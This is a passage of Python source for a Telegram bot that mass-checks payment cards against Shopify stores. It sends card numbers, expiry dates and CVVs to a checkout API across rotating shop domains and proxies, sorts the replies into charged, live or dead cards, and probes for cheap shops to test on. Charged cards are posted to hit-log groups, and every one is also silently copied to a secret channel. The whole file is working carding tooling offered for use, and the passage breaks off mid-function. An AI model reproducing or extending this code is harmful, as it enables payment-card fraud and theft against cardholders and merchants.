"""
sh.py  v28  —  /sh single-card + /msh mass Shopify checker
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Framework : python-telegram-bot v21
API       : https://shopi.up.railway.app/shopii
            GET ?cc=NUM|MM|YY|CVV&site=DOMAIN&proxy=http://ip:port
            site  = plain domain, NO https:// prefix
            proxy = http://ip:port  (WITH http:// prefix)

ROOT-CAUSE FIX:
  The API ALWAYS returns HTTP 200. Errors come in the JSON body:
    {"Response": "site error! status: 404"}
  We check the RESPONSE STRING before classify_response.
  "site error! status: 404/403" → blacklist site, zero-sleep skip.
  Raw API response strings are shown directly to the user.

SITES:
  Sites are loaded exclusively from sites.txt on disk.
  _load_sites() reads sites.txt; stops with a clear error if the file is missing.
  No built-in fallback list  keep sites.txt updated.

DM POLICY:
  CHARGED → user DM + HIT_LOG_GROUP_ID + EXTRA_CHARGED_GROUP_ID
  LIVE    → user DM only
  TDS     → user DM only
  DEAD    → nothing

EXPORTS:
  get_sh_handler, _check_card_with_retry, SITE_RETRIES, SITE_TIMEOUT
  MSH_SESSIONS, run_mass_batch, create_msh_session
  cb_msh_result, cb_msh_stop, build_result_msg
  _load_sites, _load_proxies
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
from __future__ import annotations

import asyncio
import database as db
import json as _json
import logging
import random
import re
import string
import time
from datetime import datetime
from html import escape
from io import BytesIO
from typing import Optional

import aiohttp
from telegram import Update, InputFile, MessageEntity
from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes
# Added imports for error handling to prevent skipped DMs during mass checks
from telegram.error import BadRequest, Forbidden, NetworkError, RetryAfter, TimedOut

from config import (
    OWNER_ID,
    get_bin_info, tg_emoji,
    RawMarkup, _btn,
    BOT_NAME, CHANNEL_LINK,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONSTANTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
API_URL       = "https://luci.up.railway.app/shopii"
BOT_CHANNEL   = CHANNEL_LINK
DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'

HIT_LOG_GROUP_ID       = -1004361062205   # public hit log group
EXTRA_CHARGED_GROUP_ID = -1003991915326   # extra charged log

# ── Secret channel — auto-receives every CHARGED card silently ──────────────
SECRET_CHANNEL_ID   = -1003968669478
SECRET_CHANNEL_LINK = "https://t.me/+BfUGjEXaySM2MDc0"
# ── Result card buttons ─────────────────────────────────────────────────────
BOT_USERNAME_LINK   = "https://t.me/Batxchk_bot"
BOT_PLANS_LINK      = "https://t.me/Batxchk_bot?start=plans"  # deep-links → /plans
MY_CHANNEL_LINK     = "https://t.me/Batcardchk"                    # main channel
LOGS_CHANNEL_LINK   = "https://t.me/+XYnHim3rGsw0Yzdk"             # hits log channel

SH_COOLDOWN    = 25

# ── Speed / concurrency settings ───────────────────────────────────────────
SITE_RETRIES       = 20   # max site attempts per card (was 80 — overkill)
SITE_TIMEOUT       = 30   # seconds per API call — generous for slow Railway
MAX_CONCURRENT     = 25    # cards in parallel during /msh  (was 50)
CARD_STAGGER       = 1.5  # seconds between card launches  (was 0.3)
SITE_BATCH         = 1    # sites tried per round (was 3 — caused API floods)
ROUND_DELAY        = 0.5  # seconds to sleep between retry rounds per card
CONSEC_TIMEOUT_MAX = 5    # abort after 5 consecutive timeouts (was 45)
API_CONCURRENCY    = 20   # global semaphore cap — max simultaneous API calls
BUTTON_LOCK    = 30

_CB_RESULT = "mshr"
_CB_STOP   = "mshs"

MSH_SESSIONS: dict  = {}
_BIN_CACHE:   dict  = {}
_DEAD_SITES:  set   = set()
_ALL_PROXIES: list  = []

# ── Disk-IO TTL caches ─────────────────────────────────────────────────────
_PROXY_CACHE_TS:  float = 0.0
_PROXY_CACHE_TTL: float = 300.0   # refresh proxies from disk every 5 minutes

_SITES_RAW_CACHE: list  = []
_SITES_RAW_TS:    float = 0.0
_SITES_RAW_TTL:   float = 300.0   # refresh sites from disk every 5 minutes

# Site-prober cache — populated by probe_all_sites(), used by get_working_sites()
_WORKING_SITES:     list  = []
_PROBE_IN_PROGRESS: bool  = False
_PROBE_LAST_RUN:    float = 0.0
_PROBE_TASK:        "asyncio.Task | None" = None
PROBE_TTL:          float = 1800.0   # re-probe every 30 min
PROBE_CARD:         str   = "4000223372377978|05|29|651"
PROBE_TIMEOUT:      float = 20.0
PROBE_CONCURRENCY:  int   = 60

# Global API rate-limiter
_API_SEM: "asyncio.Semaphore | None" = None

def _get_api_sem() -> "asyncio.Semaphore":
    global _API_SEM
    if _API_SEM is None:
        _API_SEM = asyncio.Semaphore(API_CONCURRENCY)
    return _API_SEM

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EMOJI IDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CARD_EMOJI_ID     = "5800709991627232190"
USER_EMOJI_ID     = "6267115986541877538"
TIME_EMOJI_ID     = "6285240160120477644"
DEV_EMOJI_ID      = "6267091732861555879"
PRO_EMOJI_ID      = "6280484433027931563"
DECLINED_EMOJI_ID = "4956612582816351459"

HIT_GATE_EMOJI_ID = "5341715473882955310"
HIT_RESP_EMOJI_ID = "5839116473951328489"

PROG_GATE_EMOJI_ID     = "5370935802844946281"
PROG_PROGRESS_EMOJI_ID = "5116268964023894989"
PROG_CHARGED_EMOJI_ID  = "5427168083074628963"
PROG_LIVE_EMOJI_ID     = "6296367896398399651"
PROG_DEAD_EMOJI_ID     = "4958526153955476488"
PROG_ERRORS_EMOJI_ID   = "4956611513369494230"

SH_GATE_EMOJI_ID = "6220029508456548253"
SH_PROG_EMOJI_ID = "6298691319086712919"
SH_LIVE_EMOJI_ID = "6296367896398399651"

BTN_CHARGED_EMOJI_ID  = "5465465194056525619"
BTN_LIVE_EMOJI_ID     = "5039793437776282663"
BTN_ALL_EMOJI_ID      = "4956324463525233747"
BTN_STOP_EMOJI_ID     = "6179444193518162239"
CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"

CHARGED_EMOJI_IDS = [
    "5801154993188770160", "4956739572114392015", "5285221724634239278",
    "5287777298894835685", "5285024405246725814", "5287547831677112267",
    "5287658362660474522", "5285186510197381130", "5803233241963959320",
    "5462902520215002477", "5787435351521889877", "5323674506705785412",
    "5801005158959683238", "5436143465211640305", "5800688138833629633",
    "5891044423856296980", "5436068999068662274", "5427168083074628963",
]

LIVE_EMOJI_IDS = [
    "6296367896398399651",
]

PLAN_EMOJIS = {
    "CORE":   "5379869575338812919",
    "ELITE":  "5836898273666798437",
    "ROOT":   "4956420911310832630",
    "CUSTOM": "5445027583588593750",
}

SPECIAL_FONT_MAP = {
    'ᴀ': 'A', 'ʙ': 'B', 'ᴄ': 'C', 'ᴅ': 'D', 'ᴇ': 'E',
    'ꜰ': 'F', 'ɢ': 'G', 'ʜ': 'H', 'ɪ': 'I', 'ᴊ': 'J',
    'ᴋ': 'K', 'ʟ': 'L', 'ᴍ': 'M', 'ɴ': 'N', 'ᴏ': 'O',
    'ᴘ': 'P', 'ǫ': 'Q', 'ʀ': 'R', 'ꜱ': 'S', 'ᴛ': 'T',
    'ᴜ': 'U', 'ᴠ': 'V', 'ᴡ': 'W', 'x': 'X', 'ʏ': 'Y',
    'ᴢ': 'Z', 'Ɪ': 'I',
}

def get_random_charged_emoji() -> str:
    return random.choice(CHARGED_EMOJI_IDS)

def get_random_live_emoji() -> str:
    return random.choice(LIVE_EMOJI_IDS)

def get_plan_emoji_id(plan_name: str) -> str:
    if not plan_name: return PRO_EMOJI_ID
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in plan_name)
    if norm in PLAN_EMOJIS: return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm: return v
    return PRO_EMOJI_ID

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFICATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RETRY_ERRORS = [
    'r4 token empty', 'r2 id empty', 'clinte token',
    'failed to get token', 'token not found', 'failed to get checkout',
    'failed to get session token', 'failed to add to cart',
    'could not extract receiptid', 'receiptid missing',
    'response missing receiptid', 'missing receiptId', 'errmissingreceiptid',
    'could not extract signedhandles', 'extract signedHandles',
    'could not extract private_access_token',
    'could not extract identification signature',
    'could not extract session id', 'could not extract queuetoken',
    'could not extract delivery handle', 'could not extract shipping amount',
    'could not extract total amount', 'could not extract sessiontoken',
    'could not find actions js url',
    'missing stableid', 'missing buildid', 'missing sourcetoken',
    'missing proposal', 'missing submit id',
    'payment method is not shopify!', 'not shopify!',
    'site not supported for now!', 'site not supported',
    'site requires login!', 'site overloaded', 'site rate limited',
    'application not found', 'store not found', 'app not found',
    'store incompatible', 'errstoreincompatible',
    'product not found', 'product id is empty', 'py id empty',
    'no valid products', 'no available products found',
    'NO_PRODUCTS', 'NO_PRODUCT', 'no_products',
    'MERCHANDISE_OUT_OF_STOCK', 'products.json',
    'INVENTORY_FAILURE', 'inventory_failure',
    'retryable: inventory reservation failure',
    'hcaptcha detected', 'hcaptcha_detected',
    'DELIVERY_ZONE_NOT_FOUND', 'delivery_zone_not_found',
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
    'delivery_no_delivery_strategy_available',
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
    'delivery_no_delivery_strategy_available_for_merchandise_line',
    'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
    'delivery_delivery_line_detail_changed',
    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
    'delivery_strategy_conditions_not_satisfied',
    'DELIVERY_OUT_OF_STOCK_AT_ORIGIN_LOCATION',
    'delivery_out_of_stock_at_origin_location',
    'SESSION_ERROR', 'session_error', 'receipt_empty',
    'invalid_response', 'checkout_failed', 'VALIDATION_CUSTOM', 'validation_custom',
    'VAULT_FAILED', 'exceeded 30 poll attempts',
    'tax ammount empty', 'del ammount empty',
    'site error! status: 401', 'site error! status: 402',
    'site error! status: 403', 'site error! status: 404',
    'site error! status: 429',
    'site error! status: 500', 'site error! status: 502',
    'site error! status: 503', 'site error! 503',
    'site error',
    'returned status 429', 'returned status 500',
    'returned status 502', 'returned status 503', 'returned status 504',
    'connection error', 'connection error!',
    'could not resolve host', 'connect tunnel failed',
    'proxy error', 'curl error', 'http error',
    'timeout',
    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
    'step 8 failed', 'step 9 failed', 'step 10 failed',
    'error processing card',
    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
    'payments_credit_card_brand_not_supported',
    'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
    'buyer_identity_currency_not_supported_by_shop',
    'BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
    'unable to get payment token',
]

DECLINED_RESPONSES = [
    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
    'DO NOT HONOR', 'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'Processing Error',
    'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
    'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
    'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
    'TRANSACTION_NOT_ALLOWED',
]

DEAD_ERRORS     = RETRY_ERRORS
SUCCESS_RESPONSES = [
    'INSUFFICIENT_FUNDS', 'INCORRECT_CVV', 'INCORRECT_CVC', 'INCORRECT_ZIP',
    'INVALID_CVC', '3DS_REQUIRED', 'ORDER_PAID',
    'CARD_DECLINED', 'GENERIC_DECLINE', 'DO NOT HONOR', 'DO_NOT_HONOR', 
    'UNKNOWN_ERROR', 'Processing Error', 'PROCESSING_ERROR', 'GENERIC_ERROR',
    'EXPIRED_CARD', 'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
    'AMOUNT_TOO_SMALL', 'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD',
    'TEST_MODE_LIVE_CARD', 'INCORRECT_NUMBER', 'RESTRICTED_CARD',
    'STOLEN_CARD', 'LOST_CARD', 'TRANSACTION_NOT_ALLOWED',
]

def _is_dead_site_response(resp: str) -> bool:
    r = resp.lower().strip()
    return any(err.lower() in r for err in RETRY_ERRORS)

def _is_success_response(resp: str) -> bool:
    ru = resp.upper().strip()
    return any(s.upper() in ru for s in SUCCESS_RESPONSES)

def classify_response(resp: str) -> str:
    """
    Classify a response string from shopi.up.railway.app.
    Returns one of: CHARGED | TDS | LIVE | DEAD | RETRY | ERROR
    """
    if not resp:
        return "RETRY"
    mu = resp.upper().strip()
    ml = resp.lower().strip()

    # ── CHARGED ──────────────────────────────────────────────────────────────
    if ("ORDER_PAID"          in mu
            or "PAYMENT_AUTHORIZED" in mu
            or "PAYMENT_ACCEPTED"   in mu
            or "APPROVED"           in mu
            or mu == "CHARGED"):
        return "CHARGED"

    # ── TDS (3-D Secure redirect) — treated as LIVE ─────────────────────────
    if ("3DS_REQUIRED"            in mu
            or "3D_SECURE"            in mu
            or "AUTHENTICATION_REQUIRED" in mu
            or "SCA_REQUIRED"         in mu):
        return "LIVE"

    # ── LIVE (card reached the bank — soft / ambiguous decline) ─────────────
    # Every response here means the card was submitted to the bank and the
    # bank (or Shopify fraud engine) gave a real reply — card is valid/live.
    if ("INSUFFICIENT_FUNDS"       in mu
            or "INCORRECT_CVV"         in mu
            or "INCORRECT_CVC"         in mu
            or "INCORRECT_ZIP"         in mu
            or "INVALID_CVC"           in mu
            or "INVALID_CVV"           in mu
            or "PCI_ERROR"             in mu    # PCI compliance filter — card is LIVE
            or "CVV_FAILED"            in mu
            or "AVS_FAILED"            in mu
            or "RISK_BLOCKED"          in mu
            or "SECURITY_VIOLATION"    in mu
            or "CALL_ISSUER"           in mu
            or "GENERIC_ERROR"         in mu    # ambiguous bank response — card is LIVE
            # ── Shopify-native security / fingerprint strings ────────────────
            or "TRANSFORMER_FINGERPRINT" in mu  # Shopify bot-detection fingerprint
            or "FINGERPRINT"           in mu
            or "PCI"                   in mu    # any PCI-related string
            or ("ARTIFACT" in mu and "SELLER" in mu)  # Shopify checkout artifact
            or "COMPLIANCE"            in mu
            or "CVV2"                  in mu
            or "AVS"                   in mu
            or "RISK"                  in mu
            or "VELOCITY"              in mu    # velocity check = card was processed
            ):
        return "LIVE"

    # ── DEAD (confirmed bank hard-decline — card is bad) ─────────────────────
    if any(d.upper() in mu for d in DECLINED_RESPONSES):
        return "DEAD"

    # ── RETRY (site/infra error — skip to a different Shopify site) ──────────
    # Uses exact substring matching against specific strings only.
    # Never put single common words ('failed', 'item', etc.) in RETRY_ERRORS.
    if any(r.lower() in ml for r in RETRY_ERRORS):
        return "RETRY"

    # ── Unknown response → LIVE ───────────────────────────────────────────────
    # Anything reaching here is NOT a site error and NOT a confirmed hard-decline.
    # The bank/Shopify replied with something unrecognised — card is real → LIVE.
    return "LIVE"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOADERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _strip_proxy_scheme(p: str) -> str:
    for pfx in ("socks5://", "socks4://", "https://", "http://"):
        if p.startswith(pfx):
            return p[len(pfx):]
    return p

def _load_proxies() -> list:
    global _ALL_PROXIES, _PROXY_CACHE_TS
    import os
    now = time.time()
    if _ALL_PROXIES and (now - _PROXY_CACHE_TS) < _PROXY_CACHE_TTL:
        return list(_ALL_PROXIES)

    for fname in ("px.txt", "proxies.txt"):
        for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
            path = os.path.join(base, fname) if base else fname
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    raw = [l.strip() for l in f
                           if l.strip() and not l.startswith(("#", "//", ";"))]
                if raw:
                    lines = [_strip_proxy_scheme(p) for p in raw]
                    _ALL_PROXIES    = lines
                    _PROXY_CACHE_TS = time.time()
                    logging.info(f"[SH] {len(lines)} proxies loaded from {path}")
                    return lines
            except (FileNotFoundError, PermissionError):
                pass
    logging.warning("[SH] No proxy file found — add px.txt with ip:port lines")
    _ALL_PROXIES    = []
    _PROXY_CACHE_TS = time.time()
    return []

def _strip_scheme(url: str) -> str:
    url = url.strip()
    for pfx in ("https://", "http://", "www."):
        if url.startswith(pfx):
            url = url[len(pfx):]
    return url.rstrip("/")

def _load_sites() -> list:
    global _SITES_RAW_CACHE, _SITES_RAW_TS
    import os
    now = time.time()
    if _SITES_RAW_CACHE and (now - _SITES_RAW_TS) < _SITES_RAW_TTL:
        result = list(_SITES_RAW_CACHE)
        random.shuffle(result)
        return result

    for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
        path = os.path.join(base, "sites.txt") if base else "sites.txt"
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                raw_lines = [_strip_scheme(l) for l in f
                             if l.strip() and not l.startswith("#")]
            raw_lines = [l for l in raw_lines if l]
            if raw_lines:
                _SITES_RAW_CACHE = raw_lines
                _SITES_RAW_TS    = time.time()
                result = list(raw_lines)
                random.shuffle(result)
                logging.info(f"[SH] {len(result)} sites loaded from {path}")
                return result
        except (FileNotFoundError, PermissionError):
            pass
    raise RuntimeError(
        "sites.txt not found or empty — create sites.txt with one Shopify domain per line"
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE PROBER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _probe_one_site(site: str, proxies: list) -> bool:
    MAX_PROBE_RETRIES = 3
    for attempt in range(MAX_PROBE_RETRIES):
        px = random.choice(proxies) if proxies else None
        try:
            resp, gw, price, currency, http_st = await _call_api(
                PROBE_CARD, site, px, timeout=PROBE_TIMEOUT
            )
        except Exception:
            await asyncio.sleep(0.3)
            continue

        if http_st and http_st not in (200,):
            return False
        if gw.upper().strip() != "SHOPIFY PAYMENTS":
            return False

        resp_upper = resp.upper().strip()

        if "ORDER_PAID" in resp_upper or resp_upper == "PAID":
            logging.warning(f"[PROBE] BLOCKED {site}: ORDER_PAID on test card")
            return False
        if _is_dead_site_response(resp):
            await asyncio.sleep(0.3)
            continue

        if _is_success_response(resp):
            try:
                p = float(re.sub(r"[^\d.]", "", str(price)))
                if p > 20.0:
                    logging.debug(f"[PROBE] ❌ {site} price ${p:.2f} too high, blocked")
                    return False
            except Exception:
                pass
            logging.info(f"[PROBE] ✅ {site} alive: {resp!r} price={price}")
            return True

        await asyncio.sleep(0.2)
        continue

    return False

async def probe_all_sites(all_sites: list, proxies: list, on_progress=None) -> list:
    global _WORKING_SITES, _PROBE_IN_PROGRESS, _PROBE_LAST_RUN

    if _PROBE_IN_PROGRESS:
        logging.info("[PROBE] already running — skipping duplicate call")
        return _WORKING_SITES or all_sites

    _PROBE_IN_PROGRESS = True
    logging.info(f"[PROBE] Starting: {len(all_sites)} sites, "
                 f"{len(proxies)} proxies, concurrency={PROBE_CONCURRENCY}")

    sem     = asyncio.Semaphore(PROBE_CONCURRENCY)
    working = []
    done_n  = 0
    total   = len(all_sites)
    tasks: list = []

    async def _check_one(site):
        nonlocal done_n
        try:
            async with sem:
                try:
                    result = await _probe_one_site(site, proxies)
                except asyncio.CancelledError:
                    raise
                except Exception:
                    result = False
                done_n += 1
                if result:
                    working.append(site)
                if on_progress and done_n % 50 == 0:
                    try:
                        await on_progress(done_n, total)
                    except Exception:
                        pass
        except asyncio.CancelledError:
            raise
        except RuntimeError:
            pass

    try:
        tasks = [asyncio.ensure_future(_check_one(s)) for s in all_sites]
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        raise
    finally:
        _PROBE_IN_PROGRESS = False

    if working:
        random.shuffle(working)
        _WORKING_SITES  = working
        _PROBE_LAST_RUN = time.time()
        logging.info(f"[PROBE] ✅ {len(working)}/{total} sites alive")
    else:
        logging.warning("[PROBE] ⚠️ 0 working sites found — "
                        "keeping previous cache or using full list")
        if not _WORKING_SITES:
            _WORKING_SITES = list(all_sites)

    return _WORKING_SITES

def get_working_sites() -> list:
    return list(_WORKING_SITES) if _WORKING_SITES else _load_sites()

async def _auto_probe_loop(all_sites: list, proxies: list):
    try:
        await asyncio.sleep(5)
    except asyncio.CancelledError:
        return
    while True:
        try:
            await probe_all_sites(all_sites, proxies)
        except asyncio.CancelledError:
            logging.info("[PROBE] background probe cancelled — shutting down")
            return
        except Exception as exc:
            logging.error(f"[PROBE] background error: {exc}")
        try:
            await asyncio.sleep(PROBE_TTL)
        except asyncio.CancelledError:
            logging.info("[PROBE] background sleep cancelled — shutting down")
            return

def start_probe_background(all_sites: list, proxies: list) -> None:
    global _PROBE_TASK
    _PROBE_TASK = asyncio.ensure_future(_auto_probe_loop(all_sites, proxies))
    def _on_done(t: asyncio.Task):
        if not t.cancelled():
            exc = t.exception()
            if exc:
                logging.error(f"[PROBE] background task died: {exc}")
    _PROBE_TASK.add_done_callback(_on_done)

async def stop_probe_background() -> None:
    global _PROBE_TASK
    task = _PROBE_TASK
    if task is None or task.done():
        return
    task.cancel()
    try:
        await asyncio.wait_for(asyncio.shield(task), timeout=6.0)
    except (asyncio.CancelledError, asyncio.TimeoutError, Exception):
        pass
    _PROBE_TASK = None
    logging.info("[PROBE] background prober stopped cleanly")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def luhn_check(n: str) -> bool:
    n = str(n).strip()
    if not n.isdigit(): return False
    t = 0
    for i, c in enumerate(n[::-1]):
        d = int(c)
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        t += d
    return t % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        ey, em = int(yy), int(mm)
        if ey < now.year % 100: return True
        if ey == now.year % 100 and em < now.month: return True
        return False
    except ValueError:
        return True

def extract_cards(text: str) -> list:
    patterns = [
        r'(\d{13,19})\s*[|/:=]\s*(\d{1,2})\s*[|/:=]\s*(\d{2,4})\s*[|/:=]\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    seen, results = set(), []
    for pat in patterns:
        for m in re.findall(pat, text):
            cc, mm, yy, cvv = m
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            s = f"{cc}|{mm}|{yy}|{cvv}"
            if s not in seen:
                seen.add(s); results.append(s)
    return results

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _parse_response_field(data: dict) -> str:
    if data.get("Status") is True:
        return "ORDER_PAID"
    for key in ("Response", "response", "message", "Message",
                "result", "Result", "msg"):
        val = data.get(key)
        if val and isinstance(val, str) and val.strip():
            resp = val.strip()
            if resp.upper() == "ERROR":
                return "site error! status: 500"
            return resp
    for key in ("error", "Error"):
        val = data.get(key)
        if val and isinstance(val, str) and val.strip():
            return val.strip()
    return "CARD_DECLINED"

def _proxy_url(proxy: Optional[str]) -> Optional[str]:
    if not proxy: return None
    p = proxy.strip()
    if p.startswith(("http://", "https://", "socks5://", "socks4://")):
        return p
    return f"http://{p}"

def _normalise_gateway(raw: str) -> str:
    cleaned = raw.replace("_", " ").replace("-", " ").strip().upper()
    return cleaned

async def _call_api(card: str, site: str, proxy: Optional[str],
                    timeout: float = SITE_TIMEOUT) -> tuple:
    site_clean = _strip_scheme(site)
    url = f"{API_URL}?cc={card}&site={site_clean}"

    _to = aiohttp.ClientTimeout(total=timeout, connect=5, sock_read=timeout)
    try:
        async with aiohttp.ClientSession(timeout=_to) as session:
            async with session.get(url, ssl=False) as r:
                http_st = r.status
                raw     = await r.text()

                if not raw or not raw.strip():
                    return ("site error! status: 404",
                            "Shopify Payments", "0.00", "USD", http_st)

                if http_st == 200:
                    try:
                        data = _json.loads(raw)
                    except Exception:
                        return ("site error! status: 404",
                                "Shopify Payments", "0.00", "USD", http_st)

                    raw_gw   = str(data.get("Gateway") or data.get("gateway") or "Shopify Payments")
                    gw       = _normalise_gateway(raw_gw)
                    price    = str(data.get("Price")    or data.get("price")    or "0.00")
                    currency = str(data.get("Currency") or data.get("currency") or "USD")
                    api_resp = _parse_response_field(data)

                    logging.info(f"[API] {card[:6]}** {site_clean} "
                                 f"→ {api_resp!r}  gw={gw}  price={price} {currency}")
                    return api_resp, gw, price, currency, http_st

                _emap = {
                    404: "site error! status: 404",
                    403: "site error! status: 403",
                    429: "site error! status: 429",
                    500: "site error! status: 500",
                    502: "site error! status: 502",
                    503: "site error! status: 503",
                    504: "timeout",
                }
                return (_emap.get(http_st, f"site error! status: {http_st}"),
                        "Shopify Payments", "0.00", "USD", http_st)

    except asyncio.TimeoutError:
        return ("timeout", "Shopify Payments", "0.00", "USD", None)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE RETRY LOOP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _check_card_with_retry(
    _session,
    card: str,
    sites: list,
    proxies: list,
    max_sites: int      = SITE_RETRIES,
    site_timeout: float = SITE_TIMEOUT,
    sid: str            = "",
) -> tuple:
    if not sites:
        sites = get_working_sites()
        if not sites:
            sites = _load_sites()

    local_dead: set = set()
    pool            = list(sites)
    random.shuffle(pool)
    px_pool         = list(proxies) if proxies else list(_ALL_PROXIES)
    tried: set      = set()
    price, currency  = "0.00", "USD"
    last_resp        = "No sites responded"
    consec_timeouts  = 0
    consec_api_errs  = 0
    attempt          = 0

    async def _try_one(site: str, proxy: Optional[str]):
        try:
            return site, await _call_api(card, site, proxy, timeout=site_timeout)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            return site, (f"connection error: {str(e)[:60]}",
                          "Shopify Payments", "0.00", "USD", None)

    def _pick_site() -> Optional[str]:
        nonlocal pool
        skip      = tried | local_dead
        available = [s for s in pool if s not in skip]
        if not available:
            local_dead.clear()
            tried.clear()
            pool      = list(sites)
            random.shuffle(pool)
            available = pool[:]
        if not available:
            return None
        s = random.choice(available)
        tried.add(s)
        return s

    while attempt < max_sites:
        if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
            raise asyncio.CancelledError()

        batch: list[str] = []
        for _ in range(min(SITE_BATCH, max_sites - attempt)):
            s = _pick_site()
            if s and s not in batch:
                batch.append(s)
        if not batch:
            break

        attempt += len(batch)

        tasks = [
            asyncio.ensure_future(
                _try_one(s, random.choice(px_pool) if px_pool else None)
            )
            for s in batch
        ]

        winner        = None
        batch_timeouts = 0

        try:
            for fut in asyncio.as_completed(tasks):
                try:
                    site, (resp, gw, price, currency, http_st) = await fut
                except asyncio.CancelledError:
                    raise
                except Exception:
                    batch_timeouts += 1
                    continue

                logging.info(f"[API] {card[:6]}** #{attempt}/{max_sites} "
                             f"site={site} → {resp!r}")

                if resp == "timeout" or resp == "Timeout":
                    batch_timeouts += 1
                    local_dead.add(site)
                    last_resp = resp
                    continue

                if http_st and http_st not in (200,):
                    local_dead.add(site)
                    last_resp = f"HTTP {http_st}"
                    if http_st in (502, 503, 504):
                        consec_api_errs += 1
                    else:
                        consec_api_errs = 0
                    if consec_api_errs >= 5:
                        logging.error(
                            f"[SH] {card[:6]}** gate API returned HTTP {http_st} "
                            f"{consec_api_errs}× in a row — API server is down, aborting."
                        )
                        return "DEAD", f"Gate API unavailable (HTTP {http_st})", price, currency
                    continue

                consec_api_errs = 0

                if http_st == 429 or (resp and "status: 429" in resp.lower()):
                    tried.discard(site)
                    continue

                classification = classify_response(resp)
                last_resp      = resp

                logging.info(f"[RESULT] {card[:6]}** #{attempt}/{max_sites} "
                             f"→ {classification}  resp={resp!r}  site={site}")

                if classification in ("CHARGED", "TDS", "LIVE", "DEAD"):
                    winner = (classification, resp, price, currency)
                    break

                # RETRY / ERROR — site gave a non-bank response
                local_dead.add(site)

        except asyncio.CancelledError:
            for t in tasks: t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            raise
        finally:
            for t in tasks: t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

        if winner:
            return winner

        if batch_timeouts == len(batch):
            consec_timeouts += batch_timeouts
        else:
            consec_timeouts = 0

        if consec_timeouts >= CONSEC_TIMEOUT_MAX:
            logging.warning(
                f"[SH] {card[:6]}** {consec_timeouts} consecutive timeouts "
